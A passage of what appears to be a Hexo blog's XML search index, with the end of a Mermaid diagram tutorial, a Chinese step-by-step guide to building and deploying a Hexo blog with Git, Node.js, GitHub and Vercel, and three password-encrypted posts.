-&gt;&gt; 李四: 你好！李四, 最近怎么样?</span><br><span class="line">李四--&gt;&gt;王五: 你最近怎么样，王五？</span><br><span class="line">李四--x 张三: 我很好，谢谢!</span><br><span class="line">李四-x 王五: 我很好，谢谢!</span><br><span class="line">Note right of 王五: 李四想了很长时间, 文字太长了&lt;br/&gt;不适合放在一行.</span><br><span class="line"></span><br><span class="line">李四--&gt;&gt;张三: 打量着王五...</span><br><span class="line">张三-&gt;&gt;王五: 很好... 王五, 你怎么样?</span><br></pre></td></tr></table></figure><p>下面则会生成一个流程图：</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">```mermaid</span></span><br><span class="line"><span class="comment">graph LR</span></span><br><span class="line"><span class="comment">A</span><span class="title">[</span><span class="comment">长方形</span><span class="title">]</span> <span class="literal">--</span> <span class="comment">链接</span> <span class="literal">--</span>&gt; <span class="comment">B((圆))</span></span><br><span class="line"><span class="comment">A</span> <span class="literal">--</span>&gt; <span class="comment">C(圆角长方形)</span></span><br><span class="line"><span class="comment">B</span> <span class="literal">--</span>&gt; <span class="comment">D&#123;菱形&#125;</span></span><br><span class="line"><span class="comment">C</span> <span class="literal">--</span>&gt; <span class="comment">D</span></span><br><span class="line"><span class="comment">```</span></span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[长方形] -- 链接 --&gt; B((圆))</span><br><span class="line">A --&gt; C(圆角长方形)</span><br><span class="line">B --&gt; D&#123;菱形&#125;</span><br><span class="line">C --&gt; D</span><br></pre></td></tr></table></figure><h5 id="Flowchart流程图"><a href="#Flowchart流程图" class="headerlink" title="Flowchart流程图"></a>Flowchart流程图</h5><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">```mermaid</span><br><span class="line">flowchart TD</span><br><span class="line">    A[Start] --&gt; B&#123;Is it?&#125;;</span><br><span class="line">    B --&gt;|<span class="type">Yes</span>| <span class="type">C</span>[OK];</span><br><span class="line">    C --&gt; D[Rethink];</span><br><span class="line">    D --&gt; B;</span><br><span class="line">    B ----&gt;|<span class="type">No</span>| <span class="type">E</span>[<span class="keyword">End</span>];</span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flowchart TD</span><br><span class="line">    A[Start] --&gt; B&#123;Is it?&#125;;</span><br><span class="line">    B --&gt;|Yes| C[OK];</span><br><span class="line">    C --&gt; D[Rethink];</span><br><span class="line">    D --&gt; B;</span><br><span class="line">    B ----&gt;|No| E[End];</span><br></pre></td></tr></table></figure><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><h4 id="图片图床"><a href="#图片图床" class="headerlink" title="图片图床"></a>图片图床</h4><p>给出几个链接，可以将图片上传到图床上，这样Markdown中的图片路径可以使用网上路径代替本地路径</p><h4 id="更方便的做法"><a href="#更方便的做法" class="headerlink" title="更方便的做法"></a>更方便的做法</h4><p>更方便的做法是直接绑定一个云账户，使用Typora编辑时候直接自动将图片上传为网络路径。腾讯oss，阿里oss，七牛云都不错。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo博客搭建</title>
      <link href="/post/41646.html/"/>
      <url>/post/41646.html/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>hexo简介：Hexo 是一个基于<a href="http://www.oschina.net/p/nodejs">nodejs</a> 的静态博客网站生成器。</p><p>基本要求：有手就行，看到我的你羡慕了没~</p></blockquote><h1 id="1-环境配置"><a href="#1-环境配置" class="headerlink" title="1.环境配置"></a>1.环境配置</h1><p>所需环境：</p><ul><li>[x] 1.nodejs14</li><li>[x] 2.git</li><li>[x] 3.Hexo cli</li><li>[x] 4.markdown编辑器</li></ul><h2 id="1-1-Git工具配置"><a href="#1-1-Git工具配置" class="headerlink" title="1.1.Git工具配置"></a>1.1.Git工具配置</h2><blockquote><p>Git 是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。</p><p>Git 是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件。</p><p>Git 与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式，不必服务器端软件支持。</p></blockquote><p>windows：到git官网上下载,<a href="https://gitforwindows.org/">Download git</a>,下载安装。</p><p>linux：对linux来说实在是太简单了，因为最早的git就是在linux上编写的，只需要一行代码</p><p>以Centos为例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install git</span><br></pre></td></tr></table></figure><p>安装好后，用<code>git --version</code> 来查看一下版本</p><h3 id="拓展内容-Git小乌龟的安装及使用"><a href="#拓展内容-Git小乌龟的安装及使用" class="headerlink" title="拓展内容 Git小乌龟的安装及使用"></a>拓展内容 Git小乌龟的安装及使用</h3><blockquote><p>Git小乌龟是Windows平台的一款Git管理工具，适用于不怎么喜欢使用命令行的人</p></blockquote><p>请参考链接 <a href="https://www.jianshu.com/p/33108325fc87">Git小乌龟的安装及使用 - 简书 (jianshu.com)</a></p><h2 id="1-2-Nodejs的安装"><a href="#1-2-Nodejs的安装" class="headerlink" title="1.2.Nodejs的安装"></a>1.2.Nodejs的安装</h2><blockquote><p>Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行时。</p><p>Hexo基于Nodejs进行编写</p></blockquote><p>Linux：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install nodejs</span><br><span class="line">yum install npm</span><br></pre></td></tr></table></figure><p>Windows:</p><p><a href="https://nodejs.org/en/download/">nodejs</a>选择LTS版本下载安装</p><p>安装完成后需要检查是否安装成功</p><p>Windows：</p><p>桌面右键 <code>Git bash here</code> </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm -v </span><br><span class="line">node -v</span><br></pre></td></tr></table></figure><p>查看是否安装成功</p><p><strong>可忽略</strong>国内环境大家都懂 你可以使用npm换源防止后面报错 </p><p>注：因为淘宝源更新不及时 后面许多依赖同样会导致报错 推荐使用官方源搭配Magic网络使用</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//查看源</span><br><span class="line">npm config get registry</span><br><span class="line">//更换源</span><br><span class="line">npm config <span class="built_in">set</span> registry https://registry.npmjs.org</span><br><span class="line">//淘宝源</span><br><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><h2 id="1-3-安装hexo"><a href="#1-3-安装hexo" class="headerlink" title="1.3.安装hexo"></a>1.3.安装hexo</h2><p>输入以下命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>依然需要查看是否安装成功</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure><p>新建一个文件夹并初始化hexo</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mikdir Blog &amp;&amp; <span class="built_in">cd</span> Blog//新建叫Blog的文件夹，如果你是Window直接新建文件夹并在文件夹里右键打开即可</span><br><span class="line">hexo init</span><br></pre></td></tr></table></figure><p>注意：若此时hexo init报错请使用Magic进行上网</p><p>新建完成后，指定文件夹目录下有：</p><ul><li>node_modules: 依赖包</li><li>public：存放生成的页面</li><li>scaffolds：生成文章的一些模板</li><li>source：用来存放你的文章</li><li>themes：主题</li><li>_config.yml: 博客的配置文件</li></ul><p>接下来就可以使用了 本地查看Hexo命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>在浏览器输入localhost:4000就可以看到你生成的博客了</p><h2 id="1-4-Markdown编辑器配置"><a href="#1-4-Markdown编辑器配置" class="headerlink" title="1.4.Markdown编辑器配置"></a>1.4.Markdown编辑器配置</h2><p>这里推荐Typora<a href="https://www.typora.io/">Typora — a markdown editor, markdown reader.</a></p><h1 id="2-账户配置"><a href="#2-账户配置" class="headerlink" title="2.账户配置"></a>2.账户配置</h1><h2 id="2-1-Github配置"><a href="#2-1-Github配置" class="headerlink" title="2.1.Github配置"></a>2.1.Github配置</h2><ol><li><p>首先你需要一个Github账户</p></li><li><p>新建一个仓库 推荐私人仓</p></li><li><p>在菜单里搜索Git Bash，设置user.name和user.email配置信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;你的GitHub用户名&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;你的GitHub注册邮箱&quot;</span></span><br></pre></td></tr></table></figure><p>生成ssh密钥文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;你的GitHub注册邮箱&quot;</span></span><br></pre></td></tr></table></figure><p>然后直接三个回车即可，默认不需要设置密码<br>然后找到生成的.ssh的文件夹中的id_rsa.pub密钥，将内容全部复制</p><p><img src="https://pic4.zhimg.com/v2-d1e47103ec1aa8675f68688c5d63bd27_r.jpg" alt="img"></p><p>打开<a href="https://github.com/settings/keys">GitHub_Settings_keys</a> 页面，新建new SSH Key</p></li></ol><p>   <img src="https://pic1.zhimg.com/v2-72a3f22c080e99343c3cc4aabce10e3c_r.jpg" alt="img"></p><p>   Title为标题，任意填即可，将刚刚复制的id_rsa.pub内容粘贴进去，最后点击Add SSH key。<br>   在Git Bash中检测GitHub公钥设置是否成功，输入 ssh git@github.com ：</p><p>   <img src="https://pic3.zhimg.com/v2-da481ffa686410becd4186c656b4ebd6_r.jpg" alt="img"></p><p>   如上则说明成功。这里之所以设置GitHub密钥原因是，通过非对称加密的公钥与私钥来完成加密，公钥放置在GitHub上，私钥放置在自己的电脑里。GitHub要求每次推送代码都是合法用户，所以每次推送都需要输入账号密码验证推送用户是否是合法用户，为了省去每次输入密码的步骤，采用了ssh，当你推送的时候，git就会匹配你的私钥跟GitHub上面的公钥是否是配对的，若是匹配就认为你是合法用户，则允许推送。这样可以保证每次的推送都是正确合法的。</p><ol><li><p>桌面执行命令</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">&quot;刚才新建的仓库有一个Clone</span> 复制里面的链接 粘贴到这里<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p>将里面的.git(隐藏)复制到刚才新建的hexo博客里面</p></li></ol><h2 id="2-2-Vercel配置"><a href="#2-2-Vercel配置" class="headerlink" title="2.2.Vercel配置"></a>2.2.Vercel配置</h2><p>1、先对刚才的源代码进行一次提交1、添加文件到版本库缓存区</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure><p>2、添加文件到版本库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m <span class="string">&quot;备注信息&quot;</span></span><br></pre></td></tr></table></figure><p>3、请忽略</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote <span class="keyword">add</span> origin 远程库地址</span><br></pre></td></tr></table></figure><p>4、push到远程仓库</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin main(推送到的分支名称)</span><br></pre></td></tr></table></figure><ol><li>新建一个<a href="https://vercel.com">Vercel</a>账户</li><li>点击New Project </li><li>Add Github account </li><li><img src="https://img1.tianli0.top/hexo/vercel.png" alt="">一直愉快的下一步</li><li>博客部署成功 以后上传会自动部署 若需要绑定自定义域名在Settings里面绑定即可</li></ol><h1 id="3-Hexo的使用"><a href="#3-Hexo的使用" class="headerlink" title="3.Hexo的使用"></a>3.Hexo的使用</h1><p>现在来介绍常用的Hexo 命令</p><p>相关命令：</p><ul><li>新建文章</li></ul><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> <span class="type">post</span> <span class="string">&quot;xxx&quot;</span></span><br></pre></td></tr></table></figure><ul><li>新建草稿</li></ul><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> <span class="type">draft</span> <span class="string">&quot;xxx&quot;</span></span><br></pre></td></tr></table></figure><ul><li>新建页面</li></ul><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> <span class="type">page</span> <span class="string">&quot;xxx&quot;</span></span><br></pre></td></tr></table></figure><ul><li>在指定文件目录下新建文章</li></ul><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> <span class="type">post</span> --path Web/React <span class="string">&quot;Taro小程序&quot;</span></span><br><span class="line"></span><br><span class="line">表示在_posts下面新建了一个Web文件夹(如果这个文件夹不存在)，在Web文件夹下建立了名称为React的markdown文件，title为Taro小程序</span><br></pre></td></tr></table></figure><ul><li>清除缓存</li></ul><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo c 或 hexo <span class="built_in">clean</span></span><br></pre></td></tr></table></figure><ul><li>生成静态文件</li></ul><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g 或 hexo <span class="keyword">generate</span></span><br></pre></td></tr></table></figure><ul><li>发表草稿</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hexo</span> publish draft <span class="string">&#x27;xxx&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>查看某类型下面的文章</li></ul><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">hexo</span> list &lt;<span class="keyword">type</span>&gt; </span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span>支持 page, post, route, tag, category</span><br></pre></td></tr></table></figure><p>npm install hexo -g #安装Hexo<br>npm update hexo -g #升级<br>hexo init #初始化博客</p><p>命令简写</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hexo n <span class="string">&quot;我的博客&quot;</span> == hexo new <span class="string">&quot;我的博客&quot;</span> <span class="comment">#新建文章</span></span><br><span class="line">hexo g == hexo generate <span class="comment">#生成</span></span><br><span class="line">hexo s == hexo server <span class="comment">#启动服务预览</span></span><br><span class="line">hexo d == hexo deploy <span class="comment">#部署 若使用我的教程 请忽略</span></span><br><span class="line"></span><br><span class="line">hexo server <span class="comment">#Hexo会监视文件变动并自动更新，无须重启服务器</span></span><br><span class="line">hexo server -s <span class="comment">#静态模式</span></span><br><span class="line">hexo server -p 5000 <span class="comment">#更改端口</span></span><br><span class="line">hexo server -i 192.168.1.1 <span class="comment">#自定义 IP</span></span><br><span class="line">hexo clean <span class="comment">#清除缓存，若是网页正常情况下可以忽略这条命令</span></span><br></pre></td></tr></table></figure><p>刚刚的三个命令依次是新建一篇博客文章、生成网页、在本地预览的操作。</p><p>最后修改confi.yml里面的内容 </p><h2 id="3-2主题的使用"><a href="#3-2主题的使用" class="headerlink" title="3.2主题的使用"></a>3.2主题的使用</h2><p>我的主题为<a href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></p><p>请参考里面的文档进行配置 开发者已经写的很详细了，这里不再赘述</p><hr><h1 id="我的魔改"><a href="#我的魔改" class="headerlink" title="我的魔改"></a>我的魔改</h1><ul><li><strong>就不告诉你，你气不气</strong></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>插件</title>
      <link href="/post/4317.html/"/>
      <url>/post/4317.html/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="a018e13860b599ab27ebf72873733f9c91e204b1cf9f8d6bb17811d82f048cd6">5d2895ca814fabc53021ff8e5d1600762b6f2568a99838fa5b91373cfb67be44eff7da19012db4db13932ca8bc21c9a8c56c50a5295f1d8fed8915b36570c4ed2d90d114c49eb633e19cbb749149d0c3392c13cccd2735369242372003ae464614b195b1e3f6d5b53504abce51c67a88cc5135a4be962334cb7253b25dde7486da3d7d8e29f98f485efb6e7bc1f1ef5513142e99620dee14406ef535753b51136a5fcf9b2a4ee25470aa06d71964e67c9c4592e1c37daff06650ee349b89d8d102f73bc0d1bf58e8ea3a25fc30889420b858a055980e2704381b1284ccbe01de551f4aae9e4fce882edd769dee363d77698841700272c0fc973d3bd722487f083276ef624eb3edbb3d2c72258cf8521b43701f9d48105956b33691c7546fe0f99c398d7eb43a0904afd20584bca6ae2f49d22c43ec1bbd591483c98d51c94dd7bee975b8609602501871985722a1c5922b9bd1be12d21591901142e42015af7bce84288350f7a2b4197faf2911a25d2fd4a0b83e70d852272397730a20dc3a073a1718210b027e20c6845c7e018765ccc4472f9102a51bc24aa310b625fe1c4853bb9ff323b6b4debc80a8d7f390521133026c20f4188b3ee3e8104cb0069219f603cac7d22a755d027422c747f1f68bc729b91b6ddc229a50ff32ea1bb0d24aa72fb0e166e7f4fac603fd320af55f86bb4d9a0cedd81d19d2b8ef859c41cbdf73ddefd3e9e03347be684901aef5a96a7784d576f598760145a6a703d5d2a332eb560de9dc3f5af4c0983844d2bc1a8a3c63ae8c00ba33e7d6887abe68d906046844ce6574888b15aaaad4411173a55f018ff55aa7cff8c8ddbe46587dbfec5b5593b2924b64c6ee7b9c24a1d07e854b4139dfad68f1b0b92925bfe29f608880953574e9de46d2b4dcaba6905aae6c3968c78ede91bf0215ce579e79cae94094c0e284459aa19cd60da1fafab1bf5de46d2f856b7124eb27fd30467d8816c21ccbbd1f8419e7b9026130f8474827cf7442558f0f9502ffb6bef7e1a3d7a485c419aca3f1125ed84351c72213972b8840b6cd2ddabfd86295054319d9bc01c56a9ec1b1831d43ce29d86e0195aef9c70d00f484d3d3b262cd675450c92e20039430415eb66eda8ecaf26db86c28f0fd7184c151a6649d84982849f44bb1cd06e7a53d9e72bef35f78d3d9b7fdd31bd1ac5deabc6f7d905e9390004e7a6a4f1645d4e2806708bda0f9f11ee8b54d4212ba220c3adb57a028c2137e2f646d9e80119481659babffd41b2ab09d774bf34901110074bd8316aafc77b2c62ee7b8d27b0e23d9774307f83a23b77e31a0883dc211379933ed5cb62808fc79e80633633dcb35e9cf7d22d19ba20e1fcd49a722b9e589f3cb987c5ce51b67b9c02a226dc0ed2276d9bf743c95461657af602376bbac0e449adacb845e4d12ad8f990e739fb698ccf5abf691c8a538fb216f669b6f86313d4426a085ae4524f7ee2ebebc92665c4dc874253f8e87c46840756ea223b83c71a7cbce653484be44bebe75711eb21a7138b04905534eea088ff0464b71520aee80195de124510f371ea1d0c0d12d335a6f27360ce8bb1b827e461a569b6c48d43329bab89b1c35d29ece8de94e2e284b5bbe579b40e287d0ffb85e89a6c6205444e16e51856dac9d4dd5a715e33132214e965ad3205f0cf9c80a68c23f7d69ad1b14fab8f4a9002ef9f818c312fe763b0cc6cc49686003c0fcf30432cbf66979de96bcf169e917a928d0c3b4319d852576b0281077d9bed2914facb019249122f455f71b1a9f5126806fe3d099ba479c23d5be6b4e8e5f83ea4ec89a52ec350cdb237c1b9a9293c09114ace2b929518d8734632c04cf8e7e6a5ab44b8c5d5e09363a0ccc996afc803cd879f6599edcfda8243041331e5546aebca470d12c9756fbc79697aabc45e715f79b1f358818ff2a5dd6e655b993847b2dc2bef878812fe24262e7a927a60968ff51fda153a44a725426a5935c82bb8e8af77165c090b939aa1be2db0e0122e3bacd561498d3736cd9ab67c5d4cf516d2b1594853f7dd72995f0223eb7b4ba40d71e3ed9b7a061ddeea24f5f22e752c000231e0c5f28849b3bb83aad3867d4f99d862c89</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 加密文章 </tag>
            
            <tag> 配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GitHub加载过慢问题</title>
      <link href="/post/12070.html/"/>
      <url>/post/12070.html/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="0015342a58d7ae3f3b7b01ea2978767f8adaaa3cc6a47850ff86e5c79612ed11"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 加密文章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QQ机器人</title>
      <link href="/post/28.html/"/>
      <url>/post/28.html/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="f629bd1ffcc345dc369bb6c835e64903830e894b7624c4e701ef852e268917be"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 加密文章 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
